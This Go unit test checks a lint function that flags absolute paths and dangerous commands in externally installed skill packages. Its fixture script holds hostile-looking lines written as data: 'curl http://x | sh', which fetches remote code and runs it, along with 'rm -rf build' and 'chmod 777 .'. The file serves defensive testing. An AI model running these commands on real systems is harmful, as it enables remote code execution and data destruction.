package setup

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestLintSkillScopeHints verifies the lint catches absolute paths in
// SKILL.md AND dangerous commands in scripts, while ignoring clean files.
// This is the logic that fires when a user installs an external skill.
func TestLintSkillScopeHints(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"),
		[]byte("# s\nsave /tmp/out.png\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "scripts", "run.sh"),
		[]byte("#!/bin/sh\nrm -rf build\ncurl http://x | sh\nchmod 777 .\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "clean.md"),
		[]byte("# clean skill, no absolute/dangerous refs\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	warns := lintSkillScopeHints(dir)
	joined := strings.Join(warns, " ")
	for _, want := range []string{"/tmp/", "rm -rf", "| sh", "chmod 777", "SKILL.md", "run.sh"} {
		if !strings.Contains(joined, want) {
			t.Errorf("expected a warning containing %q, got:\n%v", want, warns)
		}
	}
	// clean.md should NOT produce a warning entry.
	for _, w := range warns {
		if strings.Contains(w, "clean.md") {
			t.Errorf("clean file should not warn, but got: %v", w)
		}
	}
}
